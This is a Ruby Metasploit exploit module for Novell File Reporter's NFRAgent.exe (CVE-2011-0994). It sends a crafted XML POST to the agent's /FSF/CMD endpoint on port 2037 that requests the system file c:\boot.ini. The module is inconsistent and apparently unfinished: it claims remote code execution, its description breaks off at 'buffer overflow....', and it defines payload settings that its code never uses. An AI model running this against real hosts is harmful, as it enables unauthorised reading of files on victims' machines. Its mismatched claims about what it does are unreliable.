##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell File Reporter NFRAgent.exe XML Parsing Remote Code Execution Vulnerability',
			'Description'    => %q{
					This module exploits a buffer overflow....
			},
			'Author'         => [
				'Stephen Fewer', # Vulnerability discovery
				'juan vazquez' # Metasploit module
			],
			'License'        => MSF_LICENSE,
			'Platform'       => [ 'win' ],
			'Privileged'     => true,
			'References'     =>
				[
					[ 'CVE', '2011-0994' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-167/' ]
				],
			'Payload'        =>
				{
					'Space'           => 1000,
					'BadChars'        => "",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					['Windows XP SP3 / NFR Agent 1.0.3.22', { }],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 04 2011'
		))

		register_options(
			[
				Opt::RPORT(2037)
			], self.class )
	end

	def exploit

		data = "FD97A41459FD495A43E3BF922B40DB23<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>103</CMD><PATH>c:\\boot.ini</PATH></RECORD>"

		print_status("Uploading the payload via a POST request...")

		res = send_request_cgi(
			{
				'uri'     => '/FSF/CMD',
				'version' => '1.1',
				'method'  => 'POST',
				'ctype'   => "text/xml",
				'data'    => data,
			}, 5)

		if res
			print_status("#{res.code}\n#{res.body}")
		else
			print_status("no response!")
			#fail_with(Exploit::Failure::Unknown, 'POST failed')
		end

	end
end
